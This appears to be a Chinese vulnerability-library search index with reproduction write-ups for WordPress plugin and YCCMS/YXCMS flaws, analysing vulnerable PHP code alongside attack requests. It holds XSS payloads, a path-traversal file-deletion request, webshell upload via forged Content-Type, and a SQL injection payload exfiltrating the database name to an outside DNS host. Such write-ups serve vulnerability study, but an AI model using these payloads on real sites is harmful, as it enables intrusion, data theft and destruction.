</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20IMPress%20for%20IDX%20Broker%20%E4%BD%8E%E6%9D%83%E9%99%90xss%E6%BC%8F%E6%B4%9E/#cve-2020-11512","title":"CVE-2020-11512\u5229\u7528","text":"<p>\u200b   \u901a\u8fc7user1\u7528\u6237\uff08\u8ba2\u9605\u8005\u6743\u9650\uff09\u53d1\u9001\u6570\u636e\u5305\uff1a</p> <ol> <li>\u200b        POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1</li> <li>\u200b        Host: localhost</li> <li>\u200b        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0</li> <li>\u200b        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</li> <li>\u200b        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</li> <li>\u200b        Connection: close</li> <li>\u200b        Cookie:  wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7C2850d94c57420c45398bd86aa49445eb60914036c0482cd3ebc755de5a8b1239; wordpress_test_cookie=WP+Cookie+check;  wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7Cc1e4006d123d6f33199624e0a514319b21b93859faa5af2a60fc0ceda066fb73; wp-settings-time-2=1590832197</li> <li>\u200b        Upgrade-Insecure-Requests: 1</li> <li>\u200b        Content-Type: application/x-www-form-urlencoded</li> <li>\u200b       Content-Length: 0</li> <li>\u200b        </li> <li>\u200b       action=idx_update_recaptcha_key&amp;idx_recaptcha_site_key=a22212322123\"&gt;' <p>\u200b   </p> <p>\u200b   \u6b64\u65f6\u7ba1\u7406\u5458\u5bf9\u8be5\u63d2\u4ef6\u8fdb\u884c\u8bbe\u7f6e\u64cd\u4f5c\uff1a</p> <p>\u200b   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20IMPress%20for%20IDX%20Broker%20%E4%BD%8E%E6%9D%83%E9%99%90xss%E6%BC%8F%E6%B4%9E/#cve-2020-9514","title":"CVE-2020-9514\u6f0f\u6d1e\u5206\u6790","text":"<p>\u200b    \u4ece\\wp-content\\plugins\\idx-broker-platinum\\idx\\wrappers.php\u6587\u4ef6\u4e2didx_ajax_create_dynamic_page\u51fd\u6570\u4e2d202\u884c\u770b\u5230\u51fd\u6570\u901a\u8fc7post_title\u53c2\u6570\u4e2d\u83b7\u53d6\u5230\u4e86title\u6570\u636e\uff0c211\u884c\u83b7\u53d6\u5230\u4e86wrapper_page_id\u53c2\u6570\uff0c\u5728214\u548c215\u884c\u66f4\u65b0\u4e86\u6570\u636e\u5e93\uff0c\u5e76\u5728218\u884c\u9488\u5bf9\u7ed9\u5b9a\u7684id\u8fdb\u884c\u66f4\u65b0\u5143\u5b57\u6bb5\u3002 </p> <p>\u200b   \u7ee7\u7eed\u770b236\u884c\u7684idx_ajax_delete_dynamic_page\u51fd\u6570\uff0c\u63a5\u6536\u5230post\u53c2\u6570wrapper_page_id\uff0c\u7136\u540e\u8fdb\u884c\u5220\u9664\u8be5\u6570\u636e\u64cd\u4f5c</p> <p>\u200b   </p> <p>\u200b   \u6211\u4eec\u627e\u4e00\u4e0b\u8fd9\u4e24\u4e2a\u51fd\u6570\u7684\u8c03\u7528\u4f4d\u7f6e\uff1a</p> <p>\u200b   </p> <p>\u200b   \u597d\u4e86\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e24\u4e2a\u51fd\u6570\u5168\u90e8\u6302\u94a9\u5728wp_ajax\u5f00\u5934\u7684\u94a9\u5b50\u4e0a\uff0c\u5229\u7528\u4e0a\u9762\u7684\u8d8a\u6743\u64cd\u4f5c\u5373\u53ef\u64cd\u4f5c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20IMPress%20for%20IDX%20Broker%20%E4%BD%8E%E6%9D%83%E9%99%90xss%E6%BC%8F%E6%B4%9E/#cve-2020-9514_1","title":"CVE-2020-9514\u6f0f\u6d1e\u5229\u7528","text":"<p>\u200b   \u9996\u5148\u6dfb\u52a0\u4e00\u4e2aWrapper\u9875\u9762</p> <p>\u200b   </p> <p>\u200b   </p> <p>\u200b   \u4e0b\u9762\u4f7f\u7528user1\u7528\u6237\u8fdb\u884ccreate\u64cd\u4f5c\uff1a</p> <p>\u200b   \u9996\u5148\u5728\u9875\u9762\u4e2d\u83b7\u53d6\u4e0a\u9762\u521b\u5efa\u7684id\u503c\uff1a6</p> <p>\u200b   </p> <p>\u200b   \u64cd\u4f5c\u5982\u4e0b\uff1a</p> <p>\u200b   </p> <p>\u200b   \u53d1\u73b0\u8be5\u9875\u9762\u6570\u636e\u5df2\u6539\u53d8\uff0c\u5e76\u4e14\u7531user1\u4fee\u6539</p> <p>\u200b   </p> <p>\u200b   \u540c\u6837\u6267\u884c\u5220\u9664\u64cd\u4f5c</p> <p>\u200b   </p> <p>\u200b   \u53d1\u73b0\u5df2\u7ecf\u65e0\u4e86\uff1a</p> <p>\u200b   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20IMPress%20for%20IDX%20Broker%20%E4%BD%8E%E6%9D%83%E9%99%90xss%E6%BC%8F%E6%B4%9E/#_1","title":"\u9632\u5fa1","text":"<p>\u200b   \u901a\u8fc7\u67e5\u770b\u5bf9\u6bd4\u8865\u4e01\u4fe1\u606f\uff0c\u65b0\u7684\u7248\u672c\u4f7f\u7528current_user_can\u51fd\u6570\u5224\u65ad\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\uff0c\u5e76\u9a8c\u8bc1nonce\u673a\u5236\u9632\u5fa1CSRF\u653b\u51fb\u3002</p> <p>\u200b   </p> <p>\u200b    </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"WordPress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>\u6f0f\u6d1e\u63cf\u8ff0 wordpress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u6ca1\u6709\u5b89\u88c5wpDiscuz\u63d2\u4ef6\u662f\u6ca1\u6709\u6b64\u6f0f\u6d1e\u7684\u3002 \u5f71\u54cd\u8303\u56f4 wpDiscuz v7.0.0-v7.0.4 \u73af\u5883\u642d\u5efa https://cn.wordpress.org/latest-zh_CN.zip https://downloads.wordpress.org/plugin/wpdiscuz.7.0.3.zip \u7ba1\u7406\u5458\u767b\u5f55\uff0c\u5728\u63d2\u4ef6\u6a21\u5757\u5b89\u88c5wpdiscuz\u63d2\u4ef6\uff0c\u5373\u53ef\u770b\u5230\u8bc4\u8bba\u754c\u9762\u53d8\u6210\u8fd9\u4e2a\u6837\u5b50\uff0c\u70b9\u51fb\u56fe\u7247\u7684\u5c0f\u6807\u53ef\u4e0a\u4f20\u56fe\u7247\u3002 </p> <p>\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u4fee\u6539\u4e3aGTF\u5934  \u8681\u5251\u8fde\u63a5\u6210\u529f </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/","title":"YCCMS 3.4 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08\u4e00\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":"<p>YCCMS 3.4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u5728\u4e0d\u9700\u8981\u767b\u5f55\u7684\u60c5\u51b5\u4e0a\u4f20\u6210\u529f  \u5b9a\u4f4d\u5230\u6f0f\u6d1e\u4f4d\u7f6e\uff1a controller\\CallAction.class.php</p> <pre><code>public function upLoad() {\nif (isset($_POST['send'])) {\n$_logoupload = new LogoUpload('pic',$_POST['MAX_FILE_SIZE']);\n$_path = $_logoupload-&gt;getPath();\n$_img = new Image($_path);\n$_img-&gt;xhImg(960,0);\n$_img-&gt;out();\n//echo $_path;\n$_logoupload-&gt;alertOpenerClose('\u56fe\u7247\u4e0a\u4f20\u6210\u529f\uff01','..'.$_path);\n} else {\nexit('\u8b66\u544a\uff1a\u6587\u4ef6\u8fc7\u5927\u6216\u8005\u5176\u4ed6\u672a\u77e5\u9519\u8bef\u5bfc\u81f4\u6d4f\u89c8\u5668\u5d29\u6e83\uff01');\n}\n}\n</code></pre> <p>\u7136\u540e\u8ddf\u8fdb\u5230\u7c7bLogoUpload ,\u4f4d\u4e8epublic\\class\\LogoUpload.class.php\uff0c\u4e0a\u4f20\u9996\u8981\u5173\u6ce8\u4e0a\u4f20\u662f\u662f\u5426\u5141\u8bb8\u4e0a\u4f20\u975e\u56fe\u7247\u683c\u5f0f\u7684\u6587\u4ef6</p> <pre><code>private function checkType() {\nif (!in_array($this-&gt;type,$this-&gt;typeArr)) {\nTool::alertBack('\u8b66\u544a\uff1aLOGO\u56fe\u7247\u5fc5\u987b\u662fPNG\u683c\u5f0f\uff01');\n}\n}\n\nprivate $typeArr = array('image/png','image/x-png');//\u7c7b\u578b\u5408\u96c6\n</code></pre> <p>\u6839\u636eContent-Type\u7684\u503c\u6765\u5224\u65ad\u662f\u5426\u662f\u56fe\u7247\u683c\u5f0f\uff0c\u53ea\u8981Content-Type\u662f\u8fd9\u4e24\u79cd\u7c7b\u578b\u5c31\u53ef\u4ee5\uff0c\u90a3\u76f4\u63a5\u4f2a\u9020Content-Type\u5c31\u53ef\u4ee5\u4e86 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7748#toc-4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/","title":"YCCMS 3.4 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08\u4e8c\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":"<p>YCCMS 3.4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<p> \u5728\u4e0d\u9700\u8981\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u4e0a\u4f20\u6210\u529f\uff0c\u4e0a\u4f20\u5730\u5740\u4e3aE:/phpstudy/WWW/yccms/uploads/20200509133351770.php \u5b9a\u4f4d\u6f0f\u6d1e\u4f4d\u7f6e\u4e3acontroller\\CallAction.class.php\u4e2d\u7684xhUp\u51fd\u6570</p> <pre><code>public function xhUp() {\nif (isset($_GET['type'])) {\n$_fileupload = new FileUpload('filedata',10);\n$_err=$_fileupload-&gt;checkError();\n$_path = $_fileupload-&gt;getPath();\n$_msg=\"'..$_path'\";\n$_img = new Image($_path);\n$_img-&gt;xhImg(650,0);\n$_img-&gt;out();\necho \"{'err':'\".$_err.\"','msg':\".$_msg.\"}\";\nexit();\n} else {\nTool::alertBack('\u8b66\u544a\uff1a\u7531\u4e8e\u975e\u6cd5\u64cd\u4f5c\u5bfc\u81f4\u4e0a\u4f20\u5931\u8d25\uff01');\n}\n}\n</code></pre> <p>\u8ddf\u8fdb\u5230\u7c7bFileUpload\uff0c \u4f4d\u4e8epublic\\class\\FileUpload.class.php\uff0c\u7136\u540e\u770b\u5230\u540c\u6837\u4e5f\u662f\u68c0\u67e5\u7684\u4f20\u5165\u7684Content-Type\u7684\u503c</p> <pre><code>private function checkType() {\nif (!in_array($this-&gt;type,$this-&gt;typeArr)) {\nTool::alertBack('\u8b66\u544a\uff1a\u4e0d\u5408\u6cd5\u7684\u4e0a\u4f20\u7c7b\u578b\uff01');\n}\n}\n\nprivate $typeArr = \narray('image/jpeg','image/pjpeg','image/png','image/x-png','image/gif');\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7748#toc-4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/","title":"YCCMS 3.4 \u53cd\u5c04\u578bxss","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":"<p>YCCMS 3.4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<pre><code>https://www.0-baize.org/admin/?a=html&amp;art=&lt;sCrIpT&gt;alert(ian)&lt;%2FsCrIpT&gt;&amp;m=arts\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/","title":"YCCMS 3.4 \u672a\u6388\u6743\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":"<p>YCCMS 3.4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u9996\u5148\u6765\u770b\u4e00\u4e0b\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff0c\u5728\u672a\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u6784\u9020url,\u53ea\u9700\u8981\u66f4\u6539username password notpassword\u7684\u503c\u5373\u53ef\u66f4\u6539\u6570\u636e\u5e93\u4e2dadmin\u8d26\u53f7\u7684\u76f8\u5173\u4fe1\u606f  \u53bb\u6570\u636e\u5e93\u4e2d\u67e5\u770b\u53d1\u73b0\u5df2\u7ecf\u66f4\u6539\u4e86\u8d26\u53f7\u5bc6\u7801</p> <p> \u6839\u636eurl\u6765\u5b9a\u4f4d\u4e00\u4e0b\u6f0f\u6d1e\u51fd\u6570\uff0c\u51fd\u6570\u4f4d\u4e8econtroller\\AdminAction.class.php\u4e2d\u7684update\u51fd\u6570</p> <pre><code>public function update(){\nif(isset($_POST['send'])){\nif(validate::isNullString($_POST['username'])) Tool::t_back('\u7528\u6237\u540d\u4e0d\u80fd\u4e3a\u7a7a','?a=admin&amp;m=update');\nif(validate::isNullString($_POST['password'])) Tool::t_back('\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a!','?a=admin&amp;m=update');\nif(!(validate::checkStrEquals($_POST['password'], $_POST['notpassword']))) Tool::t_back('\u4e24\u6b21\u5bc6\u7801\u4e0d\u4e00\u81f4!','?a=admin&amp;m=update');\n$this-&gt;_model-&gt;username=$_POST['username'];\n$this-&gt;_model-&gt;password=sha1($_POST['password']);\n$_edit=$this-&gt;_model-&gt;editAdmin();\nif($_edit){\ntool::layer_alert('\u5bc6\u7801\u4fee\u6539\u6210\u529f!','?a=admin&amp;m=update',6);\n}else{\ntool::layer_alert('\u5bc6\u7801\u672a\u4fee\u6539!','?a=admin&amp;m=update',6);\n}\n}\n\n$this-&gt;_tpl-&gt;assign('admin', $_SESSION['admin']);\n$this-&gt;_tpl-&gt;display('admin/public/update.tpl');\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u524d\u9762\u90fd\u662f\u4e00\u4e9b\u5224\u65ad\uff0c\u91cd\u70b9\u5173\u6ce8\u4e0beditAdmin()\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u4f4d\u4e8emodel\\AdminModel.class.php</p> <pre><code>public function editAdmin(){\n$_sql=\"UPDATE\nmy_admin\nSET\nusername='$this-&gt;username',\npassword='$this-&gt;password'\nWHERE\nid=1\nLIMIT 1\";\nreturn parent::update($_sql);\n}\n</code></pre> <p>\u8be5\u51fd\u6570\u7684\u7236\u7c7b\u4e3aModel, \u4f4d\u4e8emodel\\Model.class.php\uff0c\u770b\u4e00\u4e0bupdate\u51fd\u6570</p> <pre><code>protected function update($_sql){\nreturn $this-&gt;execute($_sql)-&gt;rowCount();\n}\n</code></pre> <p>\u8c03\u7528execute\u51fd\u6570\u53bb\u6267\u884csql\u8bed\u53e5</p> <pre><code>protected function execute($_sql){\ntry{\n$_stmt=$this-&gt;_db-&gt;prepare($_sql);\n$_stmt-&gt;execute();\n}catch (PDOException $e){\nexit('SQL\u8bed\u53e5:'.$_sql.'&lt;br /&gt;\u9519\u8bef\u4fe1\u606f:'.$e-&gt;getMessage());\n}\nreturn $_stmt;\n}\n}\n</code></pre> <p>\u8fd9\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\u4e3b\u8981\u662f\u7528\u6765\u751f\u6210SQL\u8bed\u53e5\u7136\u540e\u6267\u884cSQL\u8bed\u53e5\uff0ceditAdmin\u51fd\u6570\u76f4\u63a5\u628a\u4f20\u8fdb\u6765\u7684username password\u62fc\u63a5\u5230sql\u8bed\u53e5\u4e2d\uff0c\u7136\u540e\u53bb\u66f4\u65b0\u76f8\u5173\u8868\u4e2did=1\u7684\u6570\u636e\uff0c\u8fd9\u4e5f\u5c31\u9020\u6210\u4e86\u4efb\u610f\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS%203.4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9B%B4%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7748#toc-2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","title":"YCCMS3.4\u4efb\u610f\u6587\u4ef6\u5220\u9664","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":"<p>YCCMS 3.4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<pre><code>POST /admin/?a=pic&amp;m=delall HTTP/1.1\nHost: 127.0.0.1:8082\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 89\nOrigin: http://127.0.0.1:8082\nConnection: close\nReferer: http://127.0.0.1:8082/admin/?a=pic\nUpgrade-Insecure-Requests: 1\n\npid%5B0%5D=../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t\n</code></pre> <p>\u53ea\u9700\u8981\u66f4\u6539pid[0]\u5373\u53ef\u5728\u65e0\u767b\u5f55\u6761\u4ef6\u4e0b\u4efb\u610f\u5220\u9664\u6587\u4ef6\uff0c\u5220\u9664\u6839\u76ee\u5f55\u4e0b\u76841.txt  \u5df2\u7ecf\u5220\u9664\u6210\u529f\u4e86</p> <p></p> <p>\u5176\u5b9e\u8fd9\u8fd8\u662f\u72af\u4e86\u4e00\u4e2a\u6700\u5bb9\u6613\u72af\u7684\u9519\u8bef\uff0c\u6ca1\u6709\u5bf9\u4f20\u8fdb\u6765\u7684\u8def\u5f84\u8fdb\u884c\u8fc7\u6ee4\u5c31\u62fc\u63a5\u4e86\u76ee\u5f55\uff0c\u5bfc\u81f4\u4e86\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\u7684\u4ea7\u751f \u6839\u636eurl\u5b9a\u4f4d\u5230\u76f8\u5173\u51fd\u6570\u4f4d\u7f6e,\u4f4d\u4e8e/controller/PicAction.class.php</p> <pre><code>public function delall(){\nif(isset($_POST['send'])){\nif(validate::isNullString($_POST['pid'])) tool::layer_alert('\u6ca1\u6709\u9009\u62e9\u4efb\u4f55\u56fe\u7247!','?a=pic',7);\n$_fileDir=ROOT_PATH.'/uploads/';\nforeach($_POST['pid'] as $_value){\n$_filePath=$_fileDir.$_value;\nif(!unlink($_filePath)){\ntool::layer_alert('\u56fe\u7247\u5220\u9664\u5931\u8d25,\u8bf7\u8bbe\u6743\u9650\u4e3a777!','?a=pic',7);\n}else{\nheader('Location:?a=pic');\n}\n}\n\n}\n\n}\n</code></pre> <p>\u5bf9 pid\u4f20\u8fdb\u6765\u7684\u503c\u5e76\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\u5c31\u8fdb\u884c\u4e86\u4e86\u8def\u5f84\u7684\u62fc\u63a5\uff0c\u5bfc\u81f4\u4e86\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u89e6\u53d1\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7748#toc-4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/","title":"YXCMS 1.4.7SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/#1","title":"1. \u5f71\u54cd\u7248\u672c","text":"<p>1.4.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/#2","title":"2.\u6f0f\u6d1e\u590d\u73b0","text":"<p>url:/index.php?r=admin/fragment/index  \u5229\u7528ceye\u5f97\u5230\u7684\u56de\u663e \u7528bp\u6293\u5305\uff0c\u4fee\u6539id\u4e3a</p> <p>payload:</p> <pre><code>2 and if((select load_file(concat('\\\\',(select database()),'.36rdia.ceye.io\\abc'))),2,2)\n</code></pre> <p>\u5728ceye\u4e0a\u9762\u53ef\u4ee5\u5f97\u5230\u56de\u663e\uff1a</p> <p> \u5f97\u5230\u4e86\u6570\u636e\u5e93\u540d\u79f0yxcms 